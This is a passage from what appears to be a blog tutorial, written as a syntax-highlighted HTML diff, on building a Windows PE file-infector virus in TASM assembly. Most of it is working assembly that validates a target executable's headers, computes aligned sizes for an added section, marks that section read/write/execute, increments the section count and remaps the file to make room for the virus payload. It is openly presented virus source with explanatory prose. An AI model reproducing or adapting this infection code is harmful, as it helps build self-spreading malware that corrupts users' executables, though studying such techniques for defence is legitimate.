+</span></span><span style=display:flex><span><span style=color:#75715e>; Move ahead to the section table</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, size IMAGE_NT_HEADERS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Check that the pointer is still within the file size</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, eax
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span> ecx, [targetP]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>cmp</span> ecx, [targetFileSize]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>jge</span> findnext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Check that the last segment specified is within the file size</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, [numberOfSections]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> edx, size IMAGE_SECTION_HEADER
+</span></span><span style=display:flex><span><span style=color:#a6e22e>imul</span> ecx, edx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ebx, eax
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> ebx, ecx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span> ebx, [targetP]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>cmp</span> ebx, [targetFileSize]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>jge</span> findnext
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Save the location of the first section header</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [<span style=color:#f92672>seg</span>Headers], eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; The last segment header should be at an offset:</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;   sizeof IMAGE_SECTION_HEADER * numberOfSections - 1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, [numberOfSections]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>dec</span> ecx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> edx, size IMAGE_SECTION_HEADER
+</span></span><span style=display:flex><span><span style=color:#a6e22e>imul</span> ecx, edx
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Its an RVA from targetP so offset by eax</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> edx, eax
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> ecx, edx
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Store the location of the last segment header</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [lastSegHeader], ecx
+</span></span></code></pre></td></tr></table></div></div><p>Having to calculate two sizes (<code>VirtualSize</code>, and <code>SizeOfRawData</code>) and two offsets (<code>SecHdrVirtualAddress</code> and <code>PointerToRawData</code>) for the section header metadata may seem strange at first. The duplication is more understandable when put in context. PE sections describe something that exists both on disk, and eventually <a href=https://en.wikipedia.org/wiki/Loader_%28computing%29 target=_blank rel=noopener>once loaded by the OS</a>, in memory. These two contexts have different requirements. As one example on disk it&rsquo;s beneficial for code to be aligned to suit the filesystem. In memory it&rsquo;s beneficial for code to be aligned to suit memory pages. Having one format that can describe both the &ldquo;virtual&rdquo; (in memory) and the &ldquo;physical/raw&rdquo; (on disk) makes sense and allows for a lot of flexibility.</p><p>Calculating the right virtual size and raw data size required knowing the original unaligned size of the virus code. TASM provides a handy tool for this known as the &ldquo;location counter symbol&rdquo;.</p><p><p class=markdown-image><figure><a href=/posts/pe-infector-basics/location.counter.symbol.docs.jpg><picture><source media="(max-width: 420px)" srcset=/posts/pe-infector-basics/location.counter.symbol.docs_hu4344cfadeadaf31e075c741f147519ee_66739_400x0_resize_q75_h2_box.webp><source media="(max-width: 920px)" srcset=/posts/pe-infector-basics/location.counter.symbol.docs_hu4344cfadeadaf31e075c741f147519ee_66739_600x0_resize_q75_h2_box.webp><source media="(max-width: 1400px)" srcset=/posts/pe-infector-basics/location.counter.symbol.docs_hu4344cfadeadaf31e075c741f147519ee_66739_800x0_resize_q75_h2_box.webp><img alt="Borland Manual Screenshot" title="Borland Manual Screenshot" src=location.counter.symbol.docs.jpg loading=lazy class=img-fluid></picture></a><figcaption>Borland Turbo Assembler 5.0 'Location Counter Symbol' Docs.</figcaption></figure></p></p><p>By placing a label (<code>viral_payload</code>) at the very start of the virus code I could use the location counter symbol (<code>$</code>) in an equate that will provide an accurate size constant (<code>viral_payload_size</code>) for the rest of the code to use:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>viral_payload_size</span> EQU <span style=color:#66d9ef>$</span> <span style=color:#f92672>-</span> viral_payload
+</span></span></code></pre></div><p>This equate stayed current as I tweaked the code and avoided having to update a fixed value. The unoptimized assembly linked to later in this post ends up having <code>viral_payload_size EQU 38Eh</code>, a pretty beefy <code>910</code> bytes (<code>0x038E</code> == <code>910</code>).</p><p>Aligning the virtual and raw sections according to the required alignment sounds difficult but is just a way of saying that the unaligned size must be made evenly divisible by the alignment value. The calculation is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(((</span>originalSize - 1<span style=color:#f92672>)</span> / alignment<span style=color:#f92672>)</span> + 1<span style=color:#f92672>)</span> * alignment
+</span></span></code></pre></div><p>A typical value for the PE optional header section alignment is <code>0x1000</code>, so the adjusted <code>VirtualSize</code> of the new section assuming the <code>viral_payload_size</code> is <code>0x038E</code> is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>VirtualSize <span style=color:#f92672>=</span> <span style=color:#f92672>(((</span>0x038E - 0x1<span style=color:#f92672>)</span> / 0x1000<span style=color:#f92672>)</span> + 0x1<span style=color:#f92672>)</span> * 0x1000 
+</span></span><span style=display:flex><span>            <span style=color:#f92672>=</span> 0x1000 <span style=color:#f92672>=</span> <span style=color:#ae81ff>4096</span>
+</span></span></code></pre></div><p>For the <code>SizeOfRawData</code> a typical file alignment value is <code>0x0200</code>, so the calculation is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>SizeOfRawData <span style=color:#f92672>=</span> <span style=color:#f92672>(((</span>0x038E - 0x1<span style=color:#f92672>)</span> / 0x0200<span style=color:#f92672>)</span> + 0x1<span style=color:#f92672>)</span> * 0x0200 
+</span></span><span style=display:flex><span>              <span style=color:#f92672>=</span> 0x0400 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1024</span>
+</span></span></code></pre></div><p>In both cases you can see the aligned size ends up larger than the original virus size. The extra space in the file and in memory will be empty padding and that&rsquo;s why file infectors often find the space they need in existing executable segments.</p><p>The <code>SecHdrVirtualAddress</code> value is a relative virtual address (RVA) that specifies where the section will start in memory relative to where the loader puts the executable. Many things are specified as RVAs so it&rsquo;s important to be familiar with this concept. I wanted my new section to start after the end of the existing final section in the target executable which meant the <code>SecHdrVirtualAddress</code> for the new section needed to point at the last section&rsquo;s <code>SecHdrVirtualAddress</code> plus the last section&rsquo;s <code>VirtualSize</code>.</p><p>Similar to the <code>SecHdrVirtualAddress</code>, the <code>PointerToRawData</code> value is an RVA that specifies where the section will start relative to the beginning of the PE file on disk. The new section should start after the last section on-disk so the <code>PointerToRawData</code> value needed to be the last section&rsquo;s <code>PointerToRawData</code> plus the last section&rsquo;s <code>SizeOfRawData</code>.</p><p>The last part was setting the <code>SecHdrCharacteristics</code> flag. The new section contains code and should be executable and readable. In the future I know I&rsquo;ll want the virus code to be able to modify parts of its own section so I also wanted the section to be writable. All told this meant the flag value was the combination of the <code>IMAGE_SCN_MEM_READ</code>, <code>IMAGE_SCN_MEM_WRITE</code>, <code>IMAGE_SCN_MEM_EXECUTE</code> and <code>IMAGE_SCN_CNT_CODE</code> bitmasks.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `viral_payload_size` -&gt; unpadded virus code size</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `sectionAlignment`   -&gt; section alignment specified in the target </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                   .exe PE `OPTIONAL_HEADER`</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `fileAlignment`      -&gt; file alignment specified in the target</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                   .exe PE `OPTIONAL_HEADER`</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `edi`                -&gt; pointer to start of new virus </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                  `IMAGE_SECTION_HEADER`</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `targetP`            -&gt; pointer to the start of target .exe </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                   memory map</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `numberOfSections`   -&gt; number of sections in target .exe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; outputs:  `injectStart`        -&gt; pointer to the start of the added virus code </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                   section data.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `injectSize`         -&gt; the size of the new raw section data.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Fix the VirtualSize, ensuring its a multiple of the section alignment</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, viral_payload_size
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span> eax, <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>xor</span> edx, edx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>div</span> [sectionAlignment]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mul</span> [sectionAlignment]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> (IMAGE_SECTION_HEADER [edi]).VirtualSize, eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Fix the virtual address, again ensuring section alignment</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, [lastSegHeader]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, (IMAGE_SECTION_HEADER [ecx]).VirtualSize
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, (IMAGE_SECTION_HEADER [ecx]).SecHdrVirtualAddress
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, ecx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span> eax, <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>xor</span> edx, edx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>div</span> [sectionAlignment]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mul</span> [sectionAlignment]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [edi].SecHdrVirtualAddress, eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Back at the start of the PE file fix the section count by incrementing it</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, [targetP]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> ecx, (IMAGE_DOS_HEADER [ecx]).e_lfanew
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, [numberOfSections]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>inc</span> eax
+</span></span><span style=display:flex><span><span style=color:#75715e>; Write the updated number of sections</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> (IMAGE_NT_HEADERS [ecx]).FileHeader.NumberOfSections, ax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Fix the raw data size, ensuring it is a multiple of the file alignment</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, viral_payload_size
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sub</span> eax, <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>xor</span> edx, edx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>div</span> [fileAlignment]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mul</span> [fileAlignment]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> (IMAGE_SECTION_HEADER [edi]).SizeOfRawData, eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Fix the raw data pointer - this should point to the beginning of the</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; new section, which is located right after the end of the current last</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; section. Adding the last section&#39;s PointerToRawData (the start of the</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; last section) to SizeOfRawData gives us this address.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ebx, [lastSegHeader]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, (IMAGE_SECTION_HEADER [ebx]).PointerToRawData
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, (IMAGE_SECTION_HEADER [ebx]).SizeOfRawData
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> (IMAGE_SECTION_HEADER [edi]).PointerToRawData, eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Save the pointer to raw data and the size of the raw data</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, (IMAGE_SECTION_HEADER [edi]).PointerToRawData
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [injectStart], eax
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, (IMAGE_SECTION_HEADER [edi]).SizeOfRawData
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [injectSize], eax
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Fix the section flags. Notably we want this to be both EXECUTE and WRITE</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, IMAGE_SCN_MEM_READ <span style=color:#f92672>+</span> \
+</span></span><span style=display:flex><span>         IMAGE_SCN_MEM_WRITE <span style=color:#f92672>+</span> \
+</span></span><span style=display:flex><span>         IMAGE_SCN_MEM_EXECUTE <span style=color:#f92672>+</span> \
+</span></span><span style=display:flex><span>         IMAGE_SCN_CNT_CODE
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> (IMAGE_SECTION_HEADER [edi]).SecHdrCharacteristics, ecx
+</span></span></code></pre></td></tr></table></div></div><h1 id=writing-the-virus-code-into-the-new-section>Writing the virus code into the new section <a href=#writing-the-virus-code-into-the-new-section class=anchor>🔗</a></h1><p>The last trick I needed to perform is to expand the target&rsquo;s overall file size. The new section metadata that gets added is inside of existing slack space between the end of the <code>IMAGE_NT_HEADERS</code> structure and the beginning of the first section and didn&rsquo;t require changing the file size. The new section content will be added at the end of the file and so I had to enlarge the overall executable to make room after the last section&rsquo;s contents.</p><p>Increasing the file size turns out to be pretty easy and only required remapping the file using <code>CreateFileMappingA</code> and <code>MapViewOfFile</code> again, adjusting the arguments to account for the new space. Because I&rsquo;m modifying a PE file on disk I need to adjust by the new section&rsquo;s <code>SizeOfRawData</code> not the original unpadded size or the <code>VirtualSize</code>.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `targetFileSize`   -&gt; the original .exe size on disk (lower bound)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `injectSize`       -&gt; the size of the new virus section&#39;s raw data</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `targetFileHandle` -&gt; handle to the target .exe file</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; outputs:  `targetMapHandle`  -&gt; an updated memory map handle for the target </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                                 .exe file updated to the new size.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Calculate the new size we should map. This is the old file size + </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; the size of the new section on-disk</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, [targetFileSize]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, [injectSize]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>add</span> eax, ecx
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ebx, [targetFileHandle]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Memory map the target PE file again with this new size</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>call</span> CreateFileMappingA, \
+</span></span><span style=display:flex><span>       ebx,\                 <span style=color:#75715e>; file handle</span>
+</span></span><span style=display:flex><span>       <span style=color:#ae81ff>0h</span>,\                  <span style=color:#75715e>; sec attributes (not used for win95)</span>
+</span></span><span style=display:flex><span>       PAGE_READWRITE,\      <span style=color:#75715e>; r/w attributes</span>
+</span></span><span style=display:flex><span>       <span style=color:#ae81ff>0h</span>,\                  <span style=color:#75715e>; flProtect (??)</span>
+</span></span><span style=display:flex><span>       eax,\                 <span style=color:#75715e>; high size (adjusted filesize)</span>
+</span></span><span style=display:flex><span>       <span style=color:#ae81ff>0h</span>                    <span style=color:#75715e>; low size</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>cmp</span> eax, <span style=color:#ae81ff>0h</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>je</span> error
